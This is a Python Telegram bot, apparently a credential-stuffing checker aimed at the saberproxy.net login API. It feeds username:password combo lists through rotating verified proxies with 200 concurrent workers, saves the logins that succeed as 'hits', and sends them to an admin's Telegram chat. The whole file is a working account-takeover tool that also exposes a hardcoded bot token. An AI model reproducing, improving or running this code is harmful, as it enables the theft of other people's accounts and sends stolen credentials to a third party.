import asyncio
import os
import time
import urllib.parse
from datetime import datetime

import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# ---- config ----
BOT_TOKEN = "8828944067:AAGioyBDrBdrzbGaOnNPMkieLGDkpPeIfbg"
ADMIN_ID = 8712347172

BASE = "https://saberproxy.net"
LOGIN_URL = f"{BASE}/api/login"
AUTH_URL = f"{BASE}/api/is-authenticated"
PROXY_URL = f"{BASE}/api/get-proxy"
PLUS_URL = f"{BASE}/api/plus-status"

PROXY_TEST_URL = "http://api.ipify.org?format=json"
PROXY_TEST_TIMEOUT = 6

THREADS = 200
TIMEOUT = 8
ENRICH = False

PROXY_FILE = "proxies.txt"
CHECKED_FILE = "checked.txt"
HITS_FILE = "hits.txt"

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": BASE,
    "Referer": f"{BASE}/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

# ---- premium emoji ids ----
# format: <tg-emoji emoji-id="ID">fallback</tg-emoji>
E = {
    "check":  '<tg-emoji emoji-id="5368324170671202286">✅</tg-emoji>',
    "cross":  '<tg-emoji emoji-id="5368324170671202285">❌</tg-emoji>',
    "fire":   '<tg-emoji emoji-id="5368324170671202284">🔥</tg-emoji>',
    "bolt":   '<tg-emoji emoji-id="5368324170671202283">⚡</tg-emoji>',
    "gem":    '<tg-emoji emoji-id="5368324170671202282">💎</tg-emoji>',
    "rocket": '<tg-emoji emoji-id="5368324170671202281">🚀</tg-emoji>',
    "star":   '<tg-emoji emoji-id="5368324170671202280">⭐</tg-emoji>',
    "clock":  '<tg-emoji emoji-id="5368324170671202279">⏱</tg-emoji>',
    "chart":  '<tg-emoji emoji-id="5368324170671202278">📊</tg-emoji>',
    "lock":   '<tg-emoji emoji-id="5368324170671202277">🔒</tg-emoji>',
    "globe":  '<tg-emoji emoji-id="5368324170671202276">🌐</tg-emoji>',
    "wave":   '<tg-emoji emoji-id="5368324170671202275">👋</tg-emoji>',
    "crown":  '<tg-emoji emoji-id="5368324170671202274">👑</tg-emoji>',
    "flame":  '<tg-emoji emoji-id="5368324170671202273">🔥</tg-emoji>',
    "spark":  '<tg-emoji emoji-id="5368324170671202272">✨</tg-emoji>',
    "stop":   '<tg-emoji emoji-id="5368324170671202271">🛑</tg-emoji>',
    "skull":  '<tg-emoji emoji-id="5368324170671202270">💀</tg-emoji>',
    "target": '<tg-emoji emoji-id="5368324170671202269">🎯</tg-emoji>',
    "flash":  '<tg-emoji emoji-id="5368324170671202268">⚡</tg-emoji>',
    "shield": '<tg-emoji emoji-id="5368324170671202267">🛡</tg-emoji>',
    "party":  '<tg-emoji emoji-id="5368324170671202266">🎉</tg-emoji>',
    "search": '<tg-emoji emoji-id="5368324170671202265">🔍</tg-emoji>',
    "save":   '<tg-emoji emoji-id="5368324170671202264">💾</tg-emoji>',
    "trash":  '<tg-emoji emoji-id="5368324170671202263">🗑</tg-emoji>',
    "list":   '<tg-emoji emoji-id="5368324170671202262">📋</tg-emoji>',
    "key":    '<tg-emoji emoji-id="5368324170671202261">🔑</tg-emoji>',
    "cooldown": '<tg-emoji emoji-id="5368324170671202260">❄️</tg-emoji>',
    "hot":    '<tg-emoji emoji-id="5368324170671202259">🔥</tg-emoji>',
    "new":    '<tg-emoji emoji-id="5368324170671202258">🆕</tg-emoji>',
}

# fallback for clients that don't render premium
def safe(text):
    """Strip tg-emoji tags if you ever need plain text."""
    import re
    return re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)

# ---- state ----
lock = asyncio.Lock()
stats = {"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()}
checked_set = set()
proxy_list = []
proxy_idx = 0
running = False
stop_flag = False

# ---- proxy parsing ----
def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "://" in line:
        try:
            u = urllib.parse.urlparse(line)
            if not u.hostname or not u.port:
                return None
            user = urllib.parse.unquote(u.username) if u.username else ""
            pw = urllib.parse.unquote(u.password) if u.password else ""
            auth = f"{user}:{pw}@" if user else ""
            return (u.hostname, u.port, user, pw, f"http://{auth}{u.hostname}:{u.port}")
        except Exception:
            return None
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        return (host, int(port), "", "", f"http://{host}:{port}")
    if len(parts) == 4:
        host, port, user, pw = parts
        return (host, int(port), user, pw, f"http://{user}:{pw}@{host}:{port}")
    return None

def format_proxy_line(host, port, user, pw):
    return f"{host}:{port}:{user}:{pw}" if user else f"{host}:{port}"

async def test_proxy(parsed, session):
    _, _, _, _, url = parsed
    try:
        async with session.get(PROXY_TEST_URL, proxy=url,
                               timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return bool(data.get("ip"))
    except Exception:
        return False
    return False

async def verify_and_collect(parsed_list, bot, chat_id):
    live, dead = [], 0
    total = len(parsed_list)
    sem = asyncio.Semaphore(200)

    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False)
    async with aiohttp.ClientSession(connector=conn) as session:
        async def probe(p):
            nonlocal dead
            async with sem:
                ok = await test_proxy(p, session)
            if ok:
                host, port, user, pw, _ = p
                live.append(format_proxy_line(host, port, user, pw))
            else:
                dead += 1

        await asyncio.gather(*[asyncio.create_task(probe(p)) for p in parsed_list])

    existing = set()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            existing = {l.strip() for l in f if l.strip()}
    new_ones = [p for p in live if p not in existing]
    with open(PROXY_FILE, "a") as f:
        for p in new_ones:
            f.write(p + "\n")

    msg = (
        f"{E['shield']} <b>Proxy Verification Complete</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['search']} Tested: <code>{total}</code>\n"
        f"{E['check']} Live: <b>{len(live)}</b>\n"
        f"{E['cross']} Dead: <b>{dead}</b>\n"
        f"{E['new']} Newly Added: <b>{len(new_ones)}</b>\n"
        f"{E['gem']} Pool Size: <b>{len(existing) + len(new_ones)}</b>"
    )
    await bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML)

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]

def load_checked():
    if not os.path.exists(CHECKED_FILE):
        return set()
    with open(CHECKED_FILE) as f:
        return {l.strip() for l in f if l.strip()}

def save_line(path, line):
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def next_proxy():
    global proxy_idx
    if not proxy_list:
        return None
    p = proxy_list[proxy_idx % len(proxy_list)]
    proxy_idx += 1
    parsed = parse_proxy_line(p)
    return parsed[4] if parsed else None

async def enrich(session, token):
    extra = ""
    try:
        h = {"X-XSRF-TOKEN": token}
        async with session.get(PROXY_URL, headers=h,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            p = await r.json(content_type=None)
        async with session.get(PLUS_URL, headers=h,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            s = await r.json(content_type=None)
        extra = f" plus={s.get('has_plus')} dur={s.get('duration')} open={p.get('is_open')} srv={p.get('server')}"
    except Exception:
        pass
    return extra

async def check(line, bot, session):
    global stop_flag
    line = line.strip()
    if not line or ":" not in line or stop_flag:
        return
    if line in checked_set:
        return

    user, pw = line.split(":", 1)
    proxy = next_proxy()

    try:
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(headers=HEADERS, cookie_jar=jar,
                                         connector=session.connector,
                                         timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as s:
            try:
                async with s.get(f"{BASE}/sanctum/csrf-cookie", proxy=proxy) as _:
                    pass
            except Exception:
                async with lock:
                    stats["errors"] += 1
                    stats["checked"] += 1
                return

            async with s.post(LOGIN_URL,
                              json={"username": user, "password": pw},
                              proxy=proxy, allow_redirects=False) as r:
                if r.status != 200:
                    async with lock:
                        stats["fails"] += 1
                        stats["checked"] += 1
                        checked_set.add(line)
                    save_line(CHECKED_FILE, line)
                    return

            cookies = {c.key: c.value for c in jar}
            xsrf = cookies.get("XSRF-TOKEN")
            token = urllib.parse.unquote(xsrf) if xsrf else ""

            async with s.get(AUTH_URL, proxy=proxy,
                             headers={"X-XSRF-TOKEN": token}) as auth:
                if auth.status != 200:
                    async with lock:
                        stats["fails"] += 1
                        stats["checked"] += 1
                        checked_set.add(line)
                    save_line(CHECKED_FILE, line)
                    return

            extra = await enrich(s, token) if ENRICH else ""

            async with lock:
                stats["hits"] += 1
                stats["checked"] += 1
                checked_set.add(line)

            save_line(HITS_FILE, f"{user}:{pw}{extra}")
            save_line(CHECKED_FILE, line)

            # ---- premium hit notification ----
            hit_msg = (
                f"{E['fire']} <b>NEW HIT</b> {E['fire']}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{E['key']} <code>{user}:{pw}</code>\n"
                f"{E['crown']} <b>SABERPROXY PREMIUM</b>"
                f"{extra}"
            )
            try:
                await bot.send_message(ADMIN_ID, hit_msg, parse_mode=ParseMode.HTML)
            except Exception:
                pass

    except Exception:
        async with lock:
            stats["errors"] += 1
            stats["checked"] += 1

async def worker(queue, bot, session):
    while not queue.empty() and not stop_flag:
        try:
            line = queue.get_nowait()
        except asyncio.QueueEmpty:
            break
        await check(line, bot, session)
        queue.task_done()

async def reporter(bot):
    while running and not stop_flag:
        await asyncio.sleep(8)
        elapsed = time.time() - stats["start"]
        cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
        msg = (
            f"{E['chart']} <b>LIVE STATS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
            f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
            f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
            f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
            f"{E['bolt']} CPM: <b>{cpm:.0f}</b>"
        )
        try:
            await bot.send_message(ADMIN_ID, msg, parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def run_checker(update, combos):
    global running, stop_flag, proxy_list, checked_set

    if running:
        await update.message.reply_text(
            f"{E['cooldown']} already running. /stop first.",
            parse_mode=ParseMode.HTML
        )
        return

    running = True
    stop_flag = False
    stats.update({"checked": 0, "hits": 0, "fails": 0, "errors": 0, "start": time.time()})
    proxy_list = load_proxies()
    checked_set = load_checked()

    lines = list(dict.fromkeys([l.strip() for l in combos if l.strip()]))
    if not lines:
        await update.message.reply_text(
            f"{E['cross']} no valid combos.",
            parse_mode=ParseMode.HTML
        )
        running = False
        return

    bot = update.get_bot()

    start_msg = (
        f"{E['rocket']} <b>CHECK STARTED</b> {E['rocket']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['list']} Combos: <code>{len(lines)}</code>\n"
        f"{E['globe']} Proxies: <code>{len(proxy_list)}</code>\n"
        f"{E['save']} Resume Skip: <code>{len(checked_set)}</code>\n"
        f"{E['bolt']} Threads: <code>{THREADS}</code> | Timeout: <code>{TIMEOUT}s</code>\n"
        f"{E['spark']} Hits → admin only"
    )
    await update.message.reply_text(start_msg, parse_mode=ParseMode.HTML)

    queue = asyncio.Queue()
    for l in lines:
        queue.put_nowait(l)

    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False,
                                enable_cleanup_closed=True)
    async with aiohttp.ClientSession(connector=conn) as session:
        asyncio.create_task(reporter(bot))
        await asyncio.gather(*[asyncio.create_task(worker(queue, bot, session))
                               for _ in range(THREADS)])

    elapsed = time.time() - stats["start"]
    running = False

    done_msg = (
        f"{E['party']} <b>CHECK COMPLETE</b> {E['party']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['clock']} Duration: <code>{elapsed:.1f}s</code>\n"
        f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
        f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
        f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
        f"{E['skull']} Errors: <code>{stats['errors']}</code>"
    )
    await update.message.reply_text(done_msg, parse_mode=ParseMode.HTML)

    if os.path.exists(HITS_FILE) and stats["hits"] > 0:
        try:
            await bot.send_document(
                ADMIN_ID, open(HITS_FILE, "rb"), filename="hits.txt",
                caption=f"{E['gem']} <b>HITS FILE</b> {E['gem']}",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

# ---- handlers ----
def admin_only(func):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text(
                f"{E['lock']} not for you.",
                parse_mode=ParseMode.HTML
            )
            return
        return await func(update, ctx)
    return wrapper

@admin_only
async def start_cmd(update, ctx):
    msg = (
        f"{E['wave']} <b>Welcome, Kanha</b> {E['crown']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E['rocket']} <b>COMBO CHECKING</b>\n"
        f"{E['check']} /check — reply to combos .txt\n"
        f"{E['check']} /checktext — combos after cmd\n"
        f"{E['chart']} /stats — progress\n"
        f"{E['stop']} /stop — halt run\n\n"
        f"{E['shield']} <b>PROXY MANAGEMENT</b>\n"
        f"{E['check']} /addproxy — reply to proxies .txt\n"
        f"{E['check']} /addproxytext — proxies after cmd\n"
        f"{E['list']} /listproxy — pool overview\n"
        f"{E['trash']} /cleartproxy — wipe pool\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['bolt']} Threads: <code>{THREADS}</code> | Timeout: <code>{TIMEOUT}s</code>\n"
        f"{E['lock']} Hits → admin only"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def stats_cmd(update, ctx):
    if not running:
        await update.message.reply_text(
            f"{E['cooldown']} not running.",
            parse_mode=ParseMode.HTML
        )
        return
    elapsed = time.time() - stats["start"]
    cpm = (stats["checked"] / elapsed * 60) if elapsed > 0 else 0
    msg = (
        f"{E['chart']} <b>STATS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['search']} Checked: <code>{stats['checked']}</code>\n"
        f"{E['fire']} Hits: <b>{stats['hits']}</b>\n"
        f"{E['cross']} Fails: <code>{stats['fails']}</code>\n"
        f"{E['skull']} Errors: <code>{stats['errors']}</code>\n"
        f"{E['bolt']} CPM: <b>{cpm:.0f}</b>"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def stop_cmd(update, ctx):
    global stop_flag
    stop_flag = True
    await update.message.reply_text(
        f"{E['stop']} stopping...",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def check_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with combos.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    combos = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await run_checker(update, combos)

@admin_only
async def check_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send combos on new lines after /checktext",
            parse_mode=ParseMode.HTML
        )
        return
    combos = [l.strip() for l in parts[1].splitlines() if l.strip()]
    await run_checker(update, combos)

async def _process_proxy_lines(update, raw_lines):
    parsed = [p for p in (parse_proxy_line(l) for l in raw_lines) if p]
    if not parsed:
        await update.message.reply_text(
            f"{E['cross']} no valid proxy lines.",
            parse_mode=ParseMode.HTML
        )
        return
    bot = update.get_bot()
    await update.message.reply_text(
        f"{E['search']} testing <code>{len(parsed)}</code> proxies...",
        parse_mode=ParseMode.HTML
    )
    await verify_and_collect(parsed, bot, update.effective_chat.id)

@admin_only
async def addproxy_file(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(
            f"{E['cross']} reply to a .txt file with proxies.",
            parse_mode=ParseMode.HTML
        )
        return
    file = await msg.reply_to_message.document.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    await _process_proxy_lines(update, lines)

@admin_only
async def addproxy_text(update, ctx):
    text = update.message.text or ""
    parts = text.split("\n", 1)
    if len(parts) < 2:
        await update.message.reply_text(
            f"{E['cross']} send proxies on new lines after /addproxytext",
            parse_mode=ParseMode.HTML
        )
        return
    await _process_proxy_lines(update, [l.strip() for l in parts[1].splitlines() if l.strip()])

@admin_only
async def listproxy_cmd(update, ctx):
    proxies = load_proxies()
    if not proxies:
        await update.message.reply_text(
            f"{E['cooldown']} proxy pool is empty.",
            parse_mode=ParseMode.HTML
        )
        return
    preview = "\n".join(proxies[:10])
    more = f"\n... +{len(proxies) - 10} more" if len(proxies) > 10 else ""
    msg = (
        f"{E['globe']} <b>PROXY POOL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['gem']} Size: <b>{len(proxies)}</b>\n\n"
        f"<code>{preview}</code>{more}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@admin_only
async def cleartproxy_cmd(update, ctx):
    global proxy_list, proxy_idx
    if os.path.exists(PROXY_FILE):
        os.remove(PROXY_FILE)
    proxy_list = []
    proxy_idx = 0
    await update.message.reply_text(
        f"{E['trash']} proxy pool wiped.",
        parse_mode=ParseMode.HTML
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("check", check_file))
    app.add_handler(CommandHandler("checktext", check_text))
    app.add_handler(CommandHandler("addproxy", addproxy_file))
    app.add_handler(CommandHandler("addproxytext", addproxy_text))
    app.add_handler(CommandHandler("listproxy", listproxy_cmd))
    app.add_handler(CommandHandler("cleartproxy", cleartproxy_cmd))
    print("bot up. admin=", ADMIN_ID)
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()